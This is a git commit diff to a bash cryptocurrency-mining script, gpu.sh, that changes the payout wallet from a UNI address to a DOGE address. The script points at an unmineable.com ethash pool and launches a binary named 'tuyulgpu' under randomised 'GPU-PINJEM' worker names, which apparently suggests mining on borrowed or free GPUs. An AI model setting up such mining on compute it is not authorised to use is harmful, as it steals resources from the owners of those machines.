a3dd74e3d685c007f38f0889db277c674e04854c
pogchampv10 <86230544+pogchampv10@users.noreply.github.com>
2021-06-21 15:40:20 +0530

    Update gpu.sh

--- gpu.sh
+++ gpu.sh
@@ -1,6 +1,6 @@
 #!/bin/bash
 POOL=ethash.unmineable.com:3333
-WALLET=UNI:0x734c50356ef7e511c3baa0bd35d3a6385f41f6a7.TES
+WALLET=DOGE:D5o7ggptjmEoKME4rdCBWdaVkZagiZBzvB
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-GPU-PINJEM)
 
 chmod +x tuyulgpu
